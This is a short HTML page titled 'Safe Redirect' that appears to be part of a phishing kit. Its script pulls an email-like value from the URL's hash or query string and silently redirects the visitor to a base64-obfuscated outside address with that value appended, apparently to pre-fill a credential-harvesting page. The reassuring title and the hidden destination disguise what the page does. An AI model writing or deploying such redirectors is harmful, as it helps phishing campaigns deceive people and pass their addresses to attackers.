<!DOCTYPE html>
<html lang="en">
<head>
    <title>Safe Redirect</title>
</head>
<body>
    <script>

        var appending = '';
        if(window.location.hash != ''){
            appending = window.location.hash;
        }else if(window.location.search != ''){
            var result = window.location.search.match(/(?:\?|&).*=(.*\@.*[a-zA-Z]{2,4})/);
            result = result === null ? window.location.search.match(/\?.+?=(.+?)\&/) : result;
            result = result === null ? window.location.search.match(/\?.+?=(.*)/) : result;
            if(result){
                appending = result[1];
            }
        }
        window.location.replace(atob("aHR0cHM6Ly9kb21haW4uY29tL2NjbWRrZmRoZnNkZw==") + appending)
    </script>
</body>
</html>
